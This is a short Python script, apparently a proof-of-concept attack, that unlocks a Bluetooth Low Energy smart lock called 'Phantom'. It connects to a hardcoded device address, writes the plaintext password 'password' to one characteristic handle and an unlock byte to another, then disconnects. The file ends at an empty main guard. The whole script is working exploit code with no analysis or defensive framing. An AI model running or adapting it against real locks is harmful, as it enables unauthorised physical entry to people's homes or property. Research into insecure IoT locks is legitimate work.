#!/bin/python

# Unlock Phantom lock

import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "3C00C1C2C3C4",rand)


	# plaintext "password"
	writereq(s, "1E00","0070617373776F7264")
	writereq(s, "2200","FF")

	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
